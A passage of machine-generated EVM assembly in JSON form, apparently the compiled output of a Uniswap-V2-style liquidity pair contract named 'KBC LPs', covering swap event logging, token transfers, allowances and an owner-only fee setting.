											"begin": 14749,
											"end": 14815,
											"name": "DUP1"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "MLOAD"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "DUP4"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "DUP2"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "MSTORE"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "DUP2"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "ADD"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "DUP4"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "SWAP1"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "MSTORE"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "DUP1"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "DUP3"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "ADD"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "DUP14"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "SWAP1"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "MSTORE"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "DUP2"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "ADD"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "DUP13"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "SWAP1"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "MSTORE"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "SWAP1"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "DUP12"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "AND"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "SWAP2"
										},
										{
											"begin": 14754,
											"end": 14764,
											"name": "CALLER"
										},
										{
											"begin": 14754,
											"end": 14764,
											"name": "SWAP2"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "PUSH",
											"value": "D78AD95FA46C994B6551D0DA85FC275FE613CE37657FB8D5E3D130840159D822"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "SWAP2"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "DUP2"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "SWAP1"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "SUB"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "ADD"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "SWAP1"
										},
										{
											"begin": 14749,
											"end": 14815,
											"name": "LOG3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1292,
											"end": 1293,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1281,
											"end": 1289,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1281,
											"end": 1293,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 11956,
											"end": 14822,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "tag",
											"value": "50"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMPDEST"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MLOAD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP1"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "ADD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "4B4243204C5073"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "C8"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "MSTORE"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "POP"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "DUP2"
										},
										{
											"begin": 175,
											"end": 214,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "tag",
											"value": "56"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "JUMPDEST"
										},
										{
											"begin": 1813,
											"end": 1821,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 1813,
											"end": 1821,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1813,
											"end": 1821,
											"name": "DUP1"
										},
										{
											"begin": 1813,
											"end": 1821,
											"name": "DUP3"
										},
										{
											"begin": 1813,
											"end": 1821,
											"name": "AND"
										},
										{
											"begin": 1813,
											"end": 1821,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1843,
											"end": 1851,
											"name": "DUP4"
										},
										{
											"begin": 1843,
											"end": 1851,
											"name": "DIV"
										},
										{
											"begin": 1843,
											"end": 1851,
											"name": "SWAP1"
										},
										{
											"begin": 1843,
											"end": 1851,
											"name": "SWAP2"
										},
										{
											"begin": 1843,
											"end": 1851,
											"name": "AND"
										},
										{
											"begin": 1843,
											"end": 1851,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1883,
											"end": 1901,
											"name": "SWAP1"
										},
										{
											"begin": 1883,
											"end": 1901,
											"name": "DIV"
										},
										{
											"begin": 1883,
											"end": 1901,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 1883,
											"end": 1901,
											"name": "AND"
										},
										{
											"begin": 1883,
											"end": 1901,
											"name": "SWAP1"
										},
										{
											"begin": 1607,
											"end": 1908,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "59"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2877,
											"end": 2881,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "PUSH [tag]",
											"value": "189"
										},
										{
											"begin": 2902,
											"end": 2912,
											"name": "CALLER"
										},
										{
											"begin": 2914,
											"end": 2921,
											"name": "DUP5"
										},
										{
											"begin": 2923,
											"end": 2928,
											"name": "DUP5"
										},
										{
											"begin": 2893,
											"end": 2901,
											"name": "PUSH [tag]",
											"value": "190"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "tag",
											"value": "189"
										},
										{
											"begin": 2893,
											"end": 2929,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 2946,
											"end": 2950,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "tag",
											"value": "188"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMPDEST"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP3"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "SWAP2"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "POP"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "POP"
										},
										{
											"begin": 2810,
											"end": 2957,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "tag",
											"value": "61"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "JUMPDEST"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "AND"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "DUP2"
										},
										{
											"begin": 587,
											"end": 608,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "tag",
											"value": "64"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "JUMPDEST"
										},
										{
											"begin": 2973,
											"end": 2980,
											"name": "PUSH",
											"value": "7"
										},
										{
											"begin": 2973,
											"end": 2980,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2973,
											"end": 2980,
											"name": "AND"
										},
										{
											"begin": 2959,
											"end": 2969,
											"name": "CALLER"
										},
										{
											"begin": 2959,
											"end": 2980,
											"name": "EQ"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "PUSH [tag]",
											"value": "192"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "JUMPI"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "DUP1"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "DUP2"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "MSTORE"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "DUP3"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "ADD"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "MSTORE"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "PUSH",
											"value": "12"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "DUP3"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "ADD"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "2830B731B0B5B29D102327A92124A22222A7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "71"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "DUP3"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "ADD"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "MSTORE"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "SWAP1"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "MLOAD"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "SWAP1"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "DUP2"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "SWAP1"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "SUB"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "ADD"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "SWAP1"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "REVERT"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "tag",
											"value": "192"
										},
										{
											"begin": 2951,
											"end": 3003,
											"name": "JUMPDEST"
										},
										{
											"begin": 3033,
											"end": 3039,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 3033,
											"end": 3049,
											"name": "DUP1"
										},
										{
											"begin": 3033,
											"end": 3049,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3033,
											"end": 3049,
											"name": "SWAP5"
										},
										{
											"begin": 3033,
											"end": 3049,
											"name": "DUP6"
										},
										{
											"begin": 3033,
											"end": 3049,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 3033,
											"end": 3049,
											"name": "SWAP2"
										},
										{
											"begin": 3033,
											"end": 3049,
											"name": "DUP3"
										},
										{
											"begin": 3033,
											"end": 3049,
											"name": "AND"
										},
										{
											"begin": 3033,
											"end": 3049,
											"name": "OR"
										},
										{
											"begin": 3033,
											"end": 3049,
											"name": "SWAP1"
										},
										{
											"begin": 3033,
											"end": 3049,
											"name": "SWAP2"
										},
										{
											"begin": 3033,
											"end": 3049,
											"name": "SSTORE"
										},
										{
											"begin": 3059,
											"end": 3065,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "DUP1"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "SLOAD"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "SWAP4"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "SWAP1"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "SWAP5"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "AND"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "SWAP3"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "AND"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "SWAP2"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "SWAP1"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "SWAP2"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "OR"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "SWAP1"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "SWAP2"
										},
										{
											"begin": 3059,
											"end": 3075,
											"name": "SSTORE"
										},
										{
											"begin": 3085,
											"end": 3091,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 3085,
											"end": 3101,
											"name": "SSTORE"
										},
										{
											"begin": 2834,
											"end": 3108,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "tag",
											"value": "66"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SLOAD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP2"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "tag",
											"value": "69"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP4"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "AND"
										},
										{
											"begin": 3219,
											"end": 3223,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "SWAP1"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP2"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3248,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "SWAP1"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP2"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP1"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP4"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "KECCAK256"
										},
										{
											"begin": 3255,
											"end": 3265,
											"name": "CALLER"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "DUP5"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "SWAP1"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "SWAP2"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "DUP2"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "KECCAK256"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 3239,
											"end": 3281,
											"name": "EQ"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "PUSH [tag]",
											"value": "194"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP5"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "AND"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP2"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3336,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP2"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP1"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP4"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "KECCAK256"
										},
										{
											"begin": 3343,
											"end": 3353,
											"name": "CALLER"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "DUP5"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SWAP2"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "KECCAK256"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SLOAD"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "PUSH [tag]",
											"value": "195"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "SWAP1"
										},
										{
											"begin": 3376,
											"end": 3381,
											"name": "DUP4"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3327,
											"end": 3358,
											"name": "PUSH [tag]",
											"value": "177"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "AND"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "tag",
											"value": "195"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP6"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "AND"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP2"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3306,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP2"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP1"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP4"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "KECCAK256"
										},
										{
											"begin": 3313,
											"end": 3323,
											"name": "CALLER"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "DUP5"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "SWAP2"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "KECCAK256"
										},
										{
											"begin": 3297,
											"end": 3395,
											"name": "SSTORE"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "tag",
											"value": "194"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "JUMPDEST"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "PUSH [tag]",
											"value": "196"
										},
										{
											"begin": 3425,
											"end": 3429,
											"name": "DUP5"
										},
										{
											"begin": 3431,
											"end": 3433,
											"name": "DUP5"
										},
										{
											"begin": 3435,
											"end": 3440,
											"name": "DUP5"
										},
										{
											"begin": 3415,
											"end": 3424,
											"name": "PUSH [tag]",
											"value": "197"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "tag",
											"value": "196"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 3458,
											"end": 3462,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP4"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP3"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "POP"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "POP"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "POP"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "tag",
											"value": "71"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMPDEST"
										},
										{
											"begin": 706,
											"end": 772,
											"name": "PUSH",
											"value": "6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "DUP2"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "tag",
											"value": "73"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMPDEST"
										},
										{
											"begin": 299,
											"end": 301,
											"name": "PUSH",
											"value": "12"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "tag",
											"value": "75"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMPDEST"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "SLOAD"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "DUP2"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "tag",
											"value": "78"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMPDEST"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "MSTORE"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SWAP1"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "DUP2"
										},
										{
											"begin": 459,
